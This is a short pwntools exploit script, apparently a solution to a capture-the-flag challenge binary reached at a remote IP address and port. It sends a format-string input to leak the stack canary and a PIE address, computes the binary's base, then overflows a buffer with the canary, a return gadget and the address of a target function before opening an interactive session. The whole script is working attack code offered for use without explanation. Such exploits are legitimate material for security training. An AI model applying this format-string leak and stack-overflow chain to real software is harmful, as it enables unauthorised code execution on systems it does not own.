from pwn import *

context.binary = elf = ELF("./chall")
context.arch = "amd64"
context.log_level = "info"

HOST = "134.112.58.12"
PORT = 10004

p = remote(HOST, PORT)

p.recvuntil(b"Speak your name to the damned : ")
p.sendline(b"%15$p|%17$p")
leak = p.recvuntil(b"Carve your message into the gate : ")

parts = leak.split(b"|")
canary = int(parts[0].split()[-1], 16)
pie_leak = int(parts[1].split(b"\n")[0], 16)
pie_base = pie_leak - 0x1373
ret = pie_base + 0x101a
charons_toll = pie_base + 0x1209

payload = (
    b"A" * 72 +
    p64(canary) +
    b"B" * 8 +
    p64(ret) +
    p64(charons_toll)
)
p.send(payload)
p.interactive()